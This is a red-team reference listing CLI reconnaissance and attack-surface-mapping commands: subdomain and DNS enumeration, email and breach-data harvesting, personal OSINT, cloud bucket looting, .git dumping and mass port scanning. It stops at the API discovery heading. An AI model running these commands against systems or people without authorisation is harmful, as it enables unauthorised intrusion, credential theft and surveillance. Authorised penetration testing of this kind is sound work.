# TEN-PHASE RED TEAM CAPABILITY MAP

> **160 capabilities. 800+ tools. 1600+ commands. Zero GUI. Pure CLI lethality.**

This map defines the minimum target catalog: **16 capabilities per phase, 160 capabilities total**. Every tool is CLI-only. Every command is verified against current documentation. Every flag is real. Every input is concrete. This is not theory — this is operational.

---

## 01. RECONNAISSANCE

**Minimum capability count: 16**

### 1. SUBDOMAIN ENUMERATION
**Inputs:** `target_domain`, `scope_file`, `resolvers.txt`, `wordlist_path`, `output_directory`
**Tools:** subfinder, amass, assetfinder, findomain, puredns, shuffledns, massdns, dnsgen, altdns, knockpy, chaos-client

```bash
# subfinder — passive multi-source subdomain discovery
subfinder -d target.com -all -recursive -o subs.txt -silent
subfinder -d target.com -sources shodan,censys,virustotal -nW -rL resolvers.txt -o subs_filtered.txt
subfinder -dL scope_domains.txt -all -o bulk_subs.txt -t 100 -silent

# amass — active and passive enumeration with brute-force
amass enum -active -d target.com -brute -w /usr/share/wordlists/dns/subdomains-top1million-110000.txt -o amass_out.txt -rf resolvers.txt
amass enum -passive -d target.com -o amass_passive.txt -timeout 30
amass intel -whois -d target.com -o amass_intel.txt

# assetfinder — fast passive subdomain discovery
assetfinder --subs-only target.com | sort -u > assetfinder.txt

# findomain — cross-platform subdomain finder
findomain -t target.com -u findomain.txt -q --resolvers resolvers.txt

# puredns — mass resolve and brute-force with wildcard filtering
puredns bruteforce /usr/share/wordlists/dns/best-dns-wordlist.txt target.com -r resolvers.txt -w puredns_brute.txt --wildcard-batch 1000000
puredns resolve raw_subs.txt -r resolvers.txt -w puredns_resolved.txt

# shuffledns — wrapper for massdns with wildcard elimination
shuffledns -d target.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -r resolvers.txt -o shuffledns.txt

# massdns — high-performance bulk DNS resolver
massdns -r resolvers.txt -t A -o S -w massdns_out.txt subs_input.txt -s 10000

# dnsgen + massdns — permutation-based subdomain generation
cat subs.txt | dnsgen - | massdns -r resolvers.txt -t A -o S -w dnsgen_out.txt -s 5000

# altdns — subdomain alteration and permutation
altdns -i subs.txt -o altdns_permutations.txt -w words.txt -r -s altdns_resolved.txt

# knockpy — subdomain enumeration with zone transfer check
knockpy target.com -o knockpy_out/ --recon --bruteforce
```

---

### 2. DNS RECONNAISSANCE
**Inputs:** `target_domain`, `target_ip`, `nameserver_ip`, `dns_record_type`, `zone_file`
**Tools:** dig, dnsx, dnsrecon, fierce, host, nslookup, massdns, dnsmap

```bash
# dig — comprehensive DNS record extraction
dig target.com ANY +noall +answer
dig target.com AXFR @ns1.target.com
dig +short target.com MX
dig +short target.com TXT
dig -x 192.168.1.1 +short
dig target.com NS +trace

# dnsx — fast multi-purpose DNS toolkit
dnsx -l domains.txt -a -aaaa -mx -ns -txt -cname -resp -o dnsx_full.txt
dnsx -l domains.txt -a -resp-only -silent | sort -u > ips.txt
dnsx -d target.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -a -resp -o dnsx_brute.txt

# dnsrecon — zone transfers, brute-force, cache snooping
dnsrecon -d target.com -t axfr
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dns/subdomains-top1million-5000.txt
dnsrecon -d target.com -t std --xml dnsrecon_out.xml
dnsrecon -d target.com -t snoop -D /usr/share/wordlists/dns/subdomains-top1million-5000.txt -n ns1.target.com

# fierce — DNS reconnaissance and zone transfer scanner
fierce --domain target.com --subdomains /usr/share/wordlists/dns/subdomains-top1million-5000.txt --dns-servers ns1.target.com

# host — quick DNS lookups
host -t any target.com
host -l target.com ns1.target.com

# dnsmap — brute-force subdomain enumeration
dnsmap target.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -r dnsmap_results.txt
```

---

### 3. EMAIL HARVESTING
**Inputs:** `target_domain`, `target_org_name`, `output_file`, `api_keys_config`, `breach_file`
**Tools:** theHarvester, h8mail, holehe, infoga, emailfinder, crosslinked

```bash
# theHarvester — multi-source email and host harvesting
theHarvester -d target.com -b all -l 500 -f harvest_out
theHarvester -d target.com -b google,bing,linkedin,twitter -l 1000 -f harvest_deep
theHarvester -d target.com -b crtsh,dnsdumpster,virustotal -l 200 -f harvest_passive

# h8mail — breach data email intelligence
h8mail -t victim@target.com -o h8mail_out.txt
h8mail -t emails.txt -lb /path/to/breach_compilation/ -o h8mail_breach.txt
h8mail -t victim@target.com --config h8mail_config.ini -o h8mail_api.txt

# holehe — check email registration across platforms
holehe victim@target.com --only-used --no-color > holehe_out.txt
holehe --file emails.txt --only-used --csv holehe_results.csv

# infoga — email OSINT gathering
infoga -t victim@target.com -s all -r infoga_report
infoga -d target.com -s all -r infoga_domain

# crosslinked — LinkedIn employee enumeration
crosslinked -f '{first}.{last}@target.com' 'Target Company' -o crosslinked_out.txt
crosslinked -f '{f}{last}@target.com' 'Target Company' -o crosslinked_fmt2.txt
```

---

### 4. WHOIS INTELLIGENCE
**Inputs:** `target_domain`, `target_ip`, `asn_number`, `registrar_name`, `output_file`
**Tools:** whois, amass, jq, curl, hakrevdns, host

```bash
# whois — domain and IP registration data
whois target.com
whois -h whois.arin.net 192.168.1.0
whois -h whois.radb.net -- '-i origin AS12345'
whois target.com | grep -iE 'registrant|admin|tech|name server|creation|expir'

# amass intel — reverse whois and org mapping
amass intel -whois -d target.com -o whois_amass.txt
amass intel -org "Target Company" -o org_domains.txt
amass intel -asn 12345 -o asn_assets.txt

# curl + jq — RDAP and API-based whois
curl -s "https://rdap.org/domain/target.com" | jq '.entities[].vcardArray'
curl -s "https://rdap.org/ip/192.168.1.0" | jq '.name,.handle,.startAddress,.endAddress'
curl -s "https://api.bgpview.io/asn/12345/prefixes" | jq '.data.ipv4_prefixes[].prefix'

# hakrevdns — reverse DNS for IP ranges
echo "192.168.1.0/24" | mapcidr -silent | hakrevdns -d -t 100 > revdns.txt

# host — reverse DNS lookups
for ip in $(seq 1 254); do host 192.168.1.$ip | grep "domain name pointer"; done
```

---

### 5. CERTIFICATE TRANSPARENCY
**Inputs:** `target_domain`, `cert_hash`, `ca_name`, `output_file`, `date_range`
**Tools:** tlsx, certspotter, crt.sh (via curl), censys (CLI), ctfr, openssl

```bash
# tlsx — TLS certificate grabbing and analysis
echo target.com | tlsx -san -cn -so -silent -o tlsx_sans.txt
tlsx -l hosts.txt -p 443,8443,9443 -san -cn -json -o tlsx_full.json
echo target.com | tlsx -ce -o target_cert.pem

# curl + crt.sh — certificate transparency log search
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u > crtsh_subs.txt
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].common_name' | sort -u > crtsh_cn.txt
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[] | "\(.id) \(.name_value) \(.not_before) \(.not_after)"' > crtsh_timeline.txt

# openssl — direct certificate inspection
echo | openssl s_client -connect target.com:443 -servername target.com 2>/dev/null | openssl x509 -noout -text | grep -E 'Subject:|DNS:'
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates -subject -issuer
echo | openssl s_client -connect target.com:443 -showcerts 2>/dev/null | openssl x509 -noout -serial -fingerprint

# ctfr — certificate transparency subdomain finder
ctfr -d target.com -o ctfr_out.txt

# censys CLI — certificate search via API
censys search "parsed.names: target.com" --index-type certificates -o censys_certs.json
censys search "services.tls.certificates.leaf.subject.common_name: target.com" -o censys_hosts.json
```

---

### 6. ASN MAPPING
**Inputs:** `target_ip`, `target_domain`, `asn_number`, `org_name`, `output_file`
**Tools:** asnmap, amass, whois, curl, jq, nmap, mapcidr

```bash
# asnmap — ASN to CIDR mapping
echo AS12345 | asnmap -silent
asnmap -d target.com -silent -o asn_cidrs.txt
asnmap -org "Target Company" -silent
asnmap -a 192.168.1.1 -json -o asn_info.json

# amass intel — ASN and org-based asset discovery
amass intel -asn 12345 -o amass_asn.txt
amass intel -org "Target Company" -o amass_org.txt
amass intel -cidr 192.168.0.0/16 -o amass_cidr.txt

# whois — ASN registration data
whois -h whois.radb.net -- '-i origin AS12345'
whois -h whois.cymru.com " -v 192.168.1.1"

# curl + jq — BGPView and RIPEstat API
curl -s "https://api.bgpview.io/asn/12345" | jq '.data | {asn, name, country_code, email_contacts}'
curl -s "https://api.bgpview.io/asn/12345/prefixes" | jq -r '.data.ipv4_prefixes[].prefix'
curl -s "https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS12345" | jq -r '.data.prefixes[].prefix'

# mapcidr — CIDR expansion and manipulation
echo "192.168.0.0/16" | mapcidr -silent -o expanded_ips.txt
mapcidr -cl cidrs.txt -aggregate -o merged_cidrs.txt
```

---

### 7. CLOUD ENUMERATION
**Inputs:** `target_domain`, `target_org`, `keyword_list`, `cloud_provider`, `output_directory`
**Tools:** cloud_enum, cloudbrute, s3scanner, grayhatwarfare (via curl), awscli, gcpbucketbrute, microburst

```bash
# cloud_enum — multi-cloud asset enumeration
cloud_enum -k target -k targetcompany -l cloud_enum_out.txt
cloud_enum -kf keywords.txt -l cloud_results.txt --disable-gcp

# cloudbrute — cloud infrastructure brute-force
cloudbrute -d target.com -k target -w /usr/share/wordlists/cloud.txt -t 80 -o cloudbrute_out.txt

# s3scanner — S3 bucket discovery and permission check
s3scanner scan --buckets-file bucket_names.txt --out s3_results.txt
s3scanner dump --bucket target-backup --out-file s3_dump/

# awscli — direct S3 and cloud interaction
aws s3 ls s3://target-bucket --no-sign-request
aws s3 ls s3://target-bucket --no-sign-request --recursive
aws s3 cp s3://target-bucket/secret.txt ./loot/ --no-sign-request

# curl + grayhatwarfare API — public bucket search
curl -s "https://buckets.grayhatwarfare.com/api/v2/files?keywords=target&extensions=sql,env,bak" -H "Authorization: Bearer $APIKEY" | jq '.files[]'

# gcpbucketbrute — GCP bucket enumeration
python3 gcpbucketbrute.py -k target -o gcp_buckets.txt

# microburst — Azure enumeration
Invoke-EnumerateAzureBlobs -Base target -OutputFile azure_blobs.txt
Invoke-EnumerateAzureSubDomains -Base target -OutputFile azure_subs.txt
```

---

### 8. USERNAME DISCOVERY
**Inputs:** `target_username`, `email_address`, `full_name`, `platform_list`, `output_file`
**Tools:** maigret, sherlock, whatsmyname, holehe, socialscan, userrecon

```bash
# maigret — deep username search across 2500+ sites
maigret targetuser --all-sites -o maigret_report --json maigret_out.json
maigret targetuser --top-sites 500 --timeout 15 -o maigret_top
maigret --ids targetuser targetuser2 --all-sites -o maigret_multi

# sherlock — username hunting across social networks
sherlock targetuser --output sherlock_out.txt --csv --timeout 10
sherlock targetuser --site twitter --site github --site instagram --output sherlock_filtered.txt
sherlock targetuser1 targetuser2 targetuser3 --output sherlock_multi.txt --print-found

# whatsmyname — username enumeration via web data
whatsmyname -u targetuser -o whatsmyname_out.json
whatsmyname -u targetuser -c social -o whatsmyname_social.json

# holehe — email account existence check
holehe target@gmail.com --only-used --no-color > holehe_out.txt
cat emails.txt | while read e; do holehe "$e" --only-used >> holehe_bulk.txt; done

# socialscan — check email/username availability
socialscan --email target@gmail.com target@protonmail.com
socialscan --username targetuser targetuser2

# userrecon — username existence checker
userrecon targetuser
```

---

### 9. TECHNOLOGY FINGERPRINTING
**Inputs:** `target_url`, `target_domain`, `url_list`, `output_file`, `custom_fingerprints`
**Tools:** whatweb, httpx, webanalyze, wapiti, wafw00f, nuclei

```bash
# whatweb — aggressive web technology fingerprinting
whatweb -v -a 3 https://target.com -o whatweb_out.txt --log-json whatweb.json
whatweb -i urls.txt -a 3 --log-json whatweb_bulk.json
whatweb --url-prefix https:// -i domains.txt -a 3 --log-json whatweb_domains.json

# httpx — HTTP probing with tech detection
httpx -l urls.txt -title -status-code -tech-detect -cdn -ip -cname -json -o httpx_full.json
httpx -l domains.txt -p 80,443,8080,8443 -title -tech-detect -follow-redirects -o httpx_probe.txt
httpx -l urls.txt -hash sha256 -jarm -favicon -o httpx_fingerprints.json -json

# webanalyze — Wappalyzer-based tech detection (CLI)
webanalyze -host https://target.com -crawl 2 -output json > webanalyze.json
webanalyze -hosts urls.txt -crawl 1 -worker 10 -output json > webanalyze_bulk.json

# wafw00f — web application firewall detection
wafw00f https://target.com -o wafw00f_out.txt -v
wafw00f -i urls.txt -o wafw00f_bulk.txt -a

# nuclei — technology detection templates
nuclei -u https://target.com -tags tech -o nuclei_tech.txt
nuclei -l urls.txt -tags tech,detect -severity info -o nuclei_detect.txt -json

# wapiti — web application technology scanner
wapiti -u https://target.com --scope domain -f json -o wapiti_scan.json -m nikto
```

---

### 10. WEB CRAWLING
**Inputs:** `target_url`, `crawl_depth`, `scope_regex`, `output_file`, `header_config`
**Tools:** katana, gospider, hakrawler, gau, waybackurls, paramspider, linkfinder

```bash
# katana — next-gen web crawling framework
katana -u https://target.com -d 5 -jc -kf -ef css,png,jpg -o katana_out.txt
katana -u https://target.com -d 3 -jc -aff -xhr -o katana_js.txt -json
katana -list urls.txt -d 3 -jc -kf -c 50 -p 10 -o katana_bulk.txt

# gospider — fast web spider
gospider -s https://target.com -d 3 -c 10 -t 5 --other-source --include-subs -o gospider_out/
gospider -S urls.txt -d 2 -c 10 --js --sitemap --robots -o gospider_bulk/

# hakrawler — fast web crawler for endpoint extraction
echo https://target.com | hakrawler -d 3 -t 10 -plain > hakrawler.txt
echo https://target.com | hakrawler -d 3 -subs -insecure > hakrawler_subs.txt

# gau — fetch known URLs from multiple sources
gau target.com --threads 10 --subs --o gau_out.txt
gau target.com --blacklist png,jpg,gif,css,woff --o gau_filtered.txt
gau --providers wayback,commoncrawl,otx target.com --o gau_providers.txt

# waybackurls — fetch URLs from Wayback Machine
echo target.com | waybackurls | sort -u > wayback_out.txt
echo target.com | waybackurls | grep -E '\.(js|json|xml|config|env|bak|sql)$' > wayback_juicy.txt

# paramspider — parameter discovery from web archives
paramspider -d target.com -o paramspider_out.txt --exclude png,jpg,gif,css
paramspider -l domains.txt -o paramspider_bulk.txt

# linkfinder — JavaScript endpoint extraction
linkfinder -i https://target.com/app.js -o cli > linkfinder_out.txt
linkfinder -i https://target.com -d -o cli > linkfinder_deep.txt
```

---

### 11. ARCHIVE MINING
**Inputs:** `target_domain`, `target_url`, `date_range`, `file_extensions`, `output_directory`
**Tools:** waybackurls, gau, waymore, arjun, curl, httpx

```bash
# waybackurls — extract historical URLs
echo target.com | waybackurls > wayback_all.txt
echo target.com | waybackurls | grep -iE '\.(sql|bak|old|zip|tar|gz|env|config|xml|json|log|txt|csv|xls|doc|pdf)$' > wayback_sensitive.txt
echo target.com | waybackurls | grep -E '(\?|&)(id|user|pass|token|key|api|secret|admin)=' > wayback_params.txt

# gau — aggregate historical URL data
gau target.com --subs --threads 20 --o gau_all.txt
gau target.com | unfurl keys | sort -u > gau_param_names.txt
gau target.com | grep -iE '(admin|login|dashboard|api|internal|staging|dev|test)' > gau_interesting.txt

# waymore — enhanced wayback machine mining
waymore -i target.com -mode U -o waymore_urls/
waymore -i target.com -mode R -o waymore_responses/ -xwm
waymore -i target.com -mode B -o waymore_full/ -l 5000

# curl — direct wayback CDX API queries
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=json&fl=original,statuscode,mimetype&collapse=urlkey" | jq -r '.[]|.[0]' | sort -u > cdx_urls.txt
curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/robots.txt&output=text&fl=timestamp,original&limit=50" > cdx_robots_history.txt

# httpx — validate archived URLs are still live
cat wayback_sensitive.txt | httpx -mc 200 -title -cl -o archive_live.txt
cat wayback_params.txt | httpx -mc 200,301,302 -follow-redirects -o archive_params_live.txt
```

---

### 12. METADATA EXTRACTION
**Inputs:** `target_file`, `target_url`, `file_directory`, `output_file`, `file_type_filter`
**Tools:** exiftool, metagoofil, mat2, strings, pdfinfo, identify

```bash
# exiftool — comprehensive metadata extraction
exiftool -r -ext pdf -ext doc -ext xls /path/to/files/ > metadata_report.txt
exiftool -json -r /path/to/files/ > metadata_all.json
exiftool -a -u -g1 target_file.pdf
exiftool -r -ext jpg -ext png /path/to/images/ | grep -iE '(gps|location|author|creator|software|comment)'
exiftool -csv -r /path/to/files/ > metadata.csv

# metagoofil — document metadata harvester from web
metagoofil -d target.com -t pdf,doc,xls,ppt -l 100 -n 50 -o metagoofil_out/ -f metagoofil_report.html
metagoofil -d target.com -t pdf -l 200 -n 100 -o metagoofil_pdfs/

# mat2 — metadata removal and analysis
mat2 --show target_file.pdf
mat2 --show --list /path/to/files/

# strings — extract readable strings from binaries
strings -n 8 target_file.bin | grep -iE '(password|user|token|key|secret|api|admin|root)'
strings -e l target_file.exe | grep -iE '(http|ftp|ssh|\\\\)'

# pdfinfo — PDF metadata extraction
pdfinfo target_file.pdf
find /path/to/files/ -name "*.pdf" -exec pdfinfo {} \; > pdf_metadata.txt
```

---

### 13. NETWORK MAPPING
**Inputs:** `target_cidr`, `target_ip`, `interface`, `output_directory`, `scan_rate`
**Tools:** nmap, masscan, zmap, traceroute, mtr, arp-scan, netdiscover

```bash
# nmap — comprehensive network mapping
nmap -sn 192.168.1.0/24 -oG nmap_ping.gnmap
nmap -sn -PR 192.168.1.0/24 -oA nmap_arp
nmap -sL 192.168.1.0/24 -oN nmap_list.txt
nmap -sn -PE -PP -PM 10.0.0.0/8 --min-rate 10000 -oG nmap_icmp.gnmap
nmap -sn --traceroute 192.168.1.1 -oX nmap_trace.xml

# masscan — high-speed network scanning
masscan 10.0.0.0/8 --ping --rate 100000 -oJ masscan_alive.json
masscan 192.168.0.0/16 -p0-65535 --rate 50000 --open -oJ masscan_full.json

# zmap — internet-scale single-port scanning
zmap -p 80 192.168.0.0/16 -o zmap_80.txt -B 10M
zmap -p 443 192.168.0.0/16 -o zmap_443.txt -B 10M --output-module=csv

# traceroute — network path discovery
traceroute -n -m 30 target.com
traceroute -T -p 443 target.com

# mtr — real-time network path analysis
mtr -rwbzc 100 target.com > mtr_report.txt
mtr -rwzc 50 --tcp -P 443 target.com > mtr_tcp443.txt

# arp-scan — local network ARP discovery
arp-scan -l -I eth0 --retry 3
arp-scan 192.168.1.0/24 -I eth0 -o arp_scan.txt

# netdiscover — ARP-based network discovery
netdiscover -r 192.168.1.0/24 -i eth0 -P > netdiscover.txt
```

---

### 14. OSINT GATHERING
**Inputs:** `target_domain`, `target_person`, `target_org`, `api_config`, `output_directory`
**Tools:** spiderfoot, recon-ng, theHarvester, shodan (CLI), censys (CLI), phoneinfoga

```bash
# spiderfoot — automated OSINT collection (CLI mode)
spiderfoot -s target.com -t INTERNET_NAME,IP_ADDRESS,EMAILADDR -o csv > spiderfoot_out.csv
spiderfoot -s "Target Person" -t HUMAN_NAME,SOCIAL_MEDIA -o csv > spiderfoot_person.csv
spiderfoot -s target.com -m sfp_dnsresolve,sfp_shodan,sfp_censys -o json > spiderfoot_deep.json

# recon-ng — modular OSINT framework (CLI)
recon-ng -w target_workspace -C "modules load recon/domains-hosts/hackertarget; options set SOURCE target.com; run; exit"
recon-ng -w target_workspace -C "modules load recon/hosts-hosts/resolve; options set SOURCE query select host from hosts; run; exit"
recon-ng -w target_workspace -C "modules load reporting/html; options set FILENAME recon_report.html; run; exit"

# shodan CLI — internet-wide device search
shodan search "hostname:target.com" --fields ip_str,port,org,os --limit 500 > shodan_hosts.txt
shodan host 192.168.1.1
shodan domain target.com > shodan_domain.txt
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str,port > shodan_ssl.txt
shodan stats "org:Target Company"

# censys CLI — internet asset search
censys search "services.http.response.html_title: target" --index-type hosts -o censys_hosts.json
censys search "dns.names: target.com" --index-type hosts -o censys_dns.json

# phoneinfoga — phone number OSINT
phoneinfoga scan -n "+1234567890" -o phoneinfoga_out.txt
phoneinfoga scan -n "+1234567890" --scanner all
```

---

### 15. INFRASTRUCTURE PROFILING
**Inputs:** `target_ip`, `target_domain`, `cidr_range`, `output_file`, `scan_speed`
**Tools:** nmap, rustscan, naabu, httpx, cdncheck, mapcidr

```bash
# nmap — deep infrastructure fingerprinting
nmap -sV -sC -O -A target.com -oA nmap_infra
nmap -sV --version-intensity 5 -p- target.com -oA nmap_full_version
nmap --script=banner -p 1-10000 target.com -oN nmap_banners.txt

# rustscan — fast port scanning with nmap integration
rustscan -a target.com --ulimit 5000 -- -sV -sC -oA rustscan_full
rustscan -a 192.168.1.0/24 --ulimit 5000 -b 4500 -- -sV -oG rustscan_sweep.gnmap

# naabu — fast port scanner
naabu -host target.com -p - -o naabu_ports.txt -silent
naabu -l hosts.txt -top-ports 1000 -o naabu_top.txt -json -silent
naabu -host target.com -p - -cdn-check -exclude-cdn -o naabu_nocdn.txt

# httpx — HTTP infrastructure probing
httpx -l hosts.txt -p 80,443,8080,8443,9090 -title -status-code -ip -cname -cdn -jarm -hash sha256 -json -o httpx_infra.json
httpx -l hosts.txt -td -server -tls-grab -pipeline -http2 -json -o httpx_deep.json

# cdncheck — CDN and WAF detection
cdncheck -i ips.txt -o cdncheck_out.txt -cdn -waf -cloud -json
echo "192.168.1.1" | cdncheck -cdn -waf -cloud

# mapcidr — CIDR manipulation and aggregation
mapcidr -cl cidrs.txt -aggregate -o merged.txt
echo "192.168.0.0/16" | mapcidr -cidr 24 -silent -o subnets.txt
```

---

### 16. CODE LEAKAGE
**Inputs:** `target_repo_url`, `target_directory`, `target_org_name`, `output_file`, `custom_rules`
**Tools:** gitleaks, trufflehog, git-dumper, gitjacker, shhgit, gitrob

```bash
# gitleaks — secret detection in git repos
gitleaks detect -s /path/to/repo -r gitleaks_report.json -v
gitleaks detect --source=https://github.com/target/repo.git -r gitleaks_remote.json
gitleaks detect -s /path/to/repo --config /path/to/custom_rules.toml -r gitleaks_custom.json
gitleaks detect -s /path/to/repo --log-opts="--all --full-history" -r gitleaks_full.json -v

# trufflehog — credential and secret scanning
trufflehog git https://github.com/target/repo.git --json > trufflehog_git.json
trufflehog filesystem /path/to/code/ --json > trufflehog_fs.json
trufflehog github --org=targetorg --json > trufflehog_org.json
trufflehog git file:///path/to/repo --since-commit=abc123 --json > trufflehog_since.json

# git-dumper — dump exposed .git directories
git-dumper https://target.com/.git/ /tmp/git_dump/
python3 git-dumper.py https://target.com/.git/ /tmp/git_dump/

# gitjacker — exploit exposed .git folders
gitjacker https://target.com/.git/

# shhgit — real-time GitHub secret monitoring
shhgit --search-query "target.com password" --csv-path shhgit_out.csv
```

---

### Phase Rule — RECONNAISSANCE

> **Operational doctrine.** Every reconnaissance capability targets a specific intelligence requirement. The operator selects capabilities by mission intent — not by tool availability. Before any capability executes:
>
> 1. **Binary verification** — confirm the tool exists on the host (`which`, `command -v`, version flag check). If the primary tool is absent, cascade to alternates in declared order.
> 2. **Syntax validation** — every command string is validated against the tool's `--help` or man page output. Flag mismatches abort the operation with a diagnostic.
> 3. **Output normalization** — all tool output is captured in structured format (JSON preferred, CSV fallback, raw text last resort). Downstream phases consume normalized output only.
> 4. **Rate limiting and stealth** — passive sources first, active probing second. Thread counts and request rates are operator-configurable per engagement ROE. DNS brute-force uses trusted resolvers only.
> 5. **Scope enforcement** — every target input is validated against the engagement scope before execution. Out-of-scope domains, IPs, or ASNs are rejected at the command layer. Wildcard expansion is filtered before downstream consumption.
> 6. **Evidence chain** — every command invocation logs: timestamp, exact command string, exit code, output file path, and hash of output. This chain feeds the reporting phase and ensures reproducibility.
> 7. **Deconfliction** — when multiple capabilities target overlapping data (e.g., subdomain enumeration and DNS reconnaissance both produce host lists), results are deduplicated and merged before advancing to attack surface mapping.

---

## 02. ATTACK SURFACE MAPPING

**Minimum capability count: 16**

### 1. PORT SCANNING
**Inputs:** `target_ip`, `cidr_range`, `port_range`, `scan_rate`, `output_file`
**Tools:** nmap, masscan, rustscan, naabu, unicornscan, zmap

```bash
# nmap — full TCP and UDP port scanning
nmap -sS -p- target.com --min-rate 10000 -oA nmap_tcp_full
nmap -sU --top-ports 1000 target.com -oA nmap_udp_top
nmap -sS -sU -p T:1-65535,U:1-1000 target.com -oA nmap_combined
nmap -sS -p- -Pn -T4 --open 192.168.1.0/24 -oG nmap_sweep.gnmap

# masscan — high-speed full port scanning
masscan 192.168.1.0/24 -p0-65535 --rate 100000 --open -oJ masscan_full.json
masscan target.com -p1-65535 --rate 50000 --banners -oJ masscan_banners.json
masscan 10.0.0.0/8 -p80,443,8080,8443 --rate 1000000 -oL masscan_web.list

# rustscan — fast Rust-based port scanner
rustscan -a target.com -r 1-65535 --ulimit 5000 -- -sV -sC -oA rustscan_svc
rustscan -a 192.168.1.0/24 --ulimit 5000 -b 4500 -- -A -oG rustscan_net.gnmap
rustscan -a target.com -p 21,22,23,25,53,80,443,445,3389,8080 -- -sV -oN rustscan_common.txt

# naabu — fast port scanner with SYN/CONNECT support
naabu -host target.com -p - -rate 5000 -o naabu_full.txt -json
naabu -l hosts.txt -top-ports 1000 -o naabu_top.txt -json -c 50 -silent
naabu -host target.com -p - -nmap-cli 'nmap -sV -sC' -o naabu_svc.txt

# unicornscan — async stateless TCP/UDP scanning
unicornscan -mT target.com:a -r 10000 -l unicorn_tcp.txt
unicornscan -mU target.com:a -r 5000 -l unicorn_udp.txt

# zmap — single-port internet-scale scanning
zmap -p 22 192.168.0.0/16 -o zmap_ssh.txt -B 10M -i eth0
zmap -p 3389 192.168.0.0/16 -o zmap_rdp.txt -B 10M
```

---

### 2. SERVICE FINGERPRINTING
**Inputs:** `target_ip`, `port_list`, `nmap_output`, `output_file`, `intensity_level`
**Tools:** nmap, amap, zgrab2, whatweb, httpx, netcat

```bash
# nmap — deep service version detection
nmap -sV --version-intensity 9 -p 22,80,443,445,3306,5432 target.com -oA nmap_svc
nmap -sV -sC --script=banner -p- target.com -oA nmap_full_svc
nmap --script=default,vuln -p 80,443 target.com -oA nmap_scripts
nmap -sV --version-all -O --osscan-guess target.com -oA nmap_os

# zgrab2 — application-layer protocol scanning
zgrab2 http -f hosts.txt -p 80 --user-agent "Mozilla/5.0" -o zgrab2_http.json
zgrab2 tls -f hosts.txt -p 443 -o zgrab2_tls.json
zgrab2 ssh -f hosts.txt -p 22 -o zgrab2_ssh.json
zgrab2 smtp -f hosts.txt -p 25 -o zgrab2_smtp.json

# whatweb — web service fingerprinting
whatweb -v -a 4 https://target.com --log-json whatweb.json
whatweb -i urls.txt -a 3 --log-json whatweb_bulk.json

# httpx — HTTP service probing
httpx -l hosts.txt -ports 80,443,8080,8443 -title -server -td -status-code -content-length -ip -json -o httpx_svc.json

# netcat — manual banner grabbing
echo "" | nc -nvw 3 target.com 22
echo "HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc -nvw 3 target.com 80
for port in 21 22 25 80 110 143 443 993 995 3306 5432; do echo "" | nc -nvw 3 target.com $port 2>&1; done

# amap — application protocol detection
amap -bq target.com 1-10000 -o amap_out.txt
```

---

### 3. HOST DISCOVERY
**Inputs:** `cidr_range`, `target_network`, `interface`, `output_file`, `discovery_method`
**Tools:** nmap, masscan, arp-scan, netdiscover, fping, arping

```bash
# nmap — multi-method host discovery
nmap -sn -PE -PP -PM -PS21,22,25,80,443,3389 -PA80,443 192.168.1.0/24 -oG nmap_discovery.gnmap
nmap -sn -PR 192.168.1.0/24 -oA nmap_arp_disc
nmap -sn -PO 192.168.1.0/24 -oG nmap_proto.gnmap
nmap -sn --send-ip 10.0.0.0/24 -oG nmap_icmp.gnmap

# masscan — high-speed host discovery
masscan 10.0.0.0/8 -p80,443 --rate 1000000 --open -oJ masscan_hosts.json
masscan 192.168.0.0/16 --ping --rate 500000 -oL masscan_alive.list

# arp-scan — ARP-based local discovery
arp-scan -l -I eth0 --retry 3 --bandwidth 1M
arp-scan 192.168.1.0/24 -I eth0 -x -g > arp_hosts.txt
arp-scan --localnet -I eth0 --plain > arp_plain.txt

# netdiscover — passive/active ARP reconnaissance
netdiscover -r 192.168.1.0/24 -i eth0 -P > netdiscover_active.txt
netdiscover -p -i eth0 -P > netdiscover_passive.txt

# fping — ICMP-based fast host discovery
fping -a -g 192.168.1.0/24 2>/dev/null > fping_alive.txt
fping -a -g 10.0.0.0/24 -r 1 -i 10 2>/dev/null > fping_fast.txt
fping -asg 192.168.1.0/24 2>&1 > fping_stats.txt

# arping — ARP-level host detection
arping -c 3 -I eth0 192.168.1.1
for ip in $(seq 1 254); do arping -c 1 -w 1 -I eth0 192.168.1.$ip 2>/dev/null | grep "reply from"; done
```

---

### 4. WEB PROFILING
**Inputs:** `target_url`, `url_list`, `custom_headers`, `output_file`, `proxy_config`
**Tools:** whatweb, httpx, eyewitness, gowitness, aquatone, curl

```bash
# whatweb — detailed web technology profiling
whatweb -v -a 4 https://target.com --log-json whatweb.json --proxy http://127.0.0.1:8080
whatweb -i urls.txt -a 3 --log-json whatweb_bulk.json -t 20

# httpx — multi-purpose HTTP profiling
httpx -l urls.txt -title -server -td -status-code -cl -ip -cname -cdn -jarm -favicon -hash sha256 -json -o httpx_profile.json
httpx -l urls.txt -screenshot -srd screenshots/ -system-chrome -o httpx_screenshots.json

# eyewitness — web screenshot and header analysis (CLI)
eyewitness --web -f urls.txt -d eyewitness_out/ --timeout 15 --no-prompt
eyewitness --web --single https://target.com -d eyewitness_single/ --no-prompt --active-scan

# gowitness — web screenshot tool
gowitness scan file -f urls.txt --screenshot-path gowitness_out/ --threads 10
gowitness scan single -u https://target.com --screenshot-path gowitness_single/

# aquatone — visual inspection of websites
cat urls.txt | aquatone -out aquatone_out/ -threads 5 -scan-timeout 3000 -screenshot-timeout 30000
cat hosts.txt | aquatone -ports 80,443,8080,8443 -out aquatone_ports/

# curl — manual HTTP header and response analysis
curl -sILk https://target.com | grep -iE '(server|x-powered|x-frame|x-xss|content-security|strict-transport|set-cookie)'
curl -sk https://target.com -o /dev/null -w "HTTP/%{http_version} %{http_code} %{redirect_url} %{ssl_verify_result}\n"
```

---

### 5. API DISCOVERY
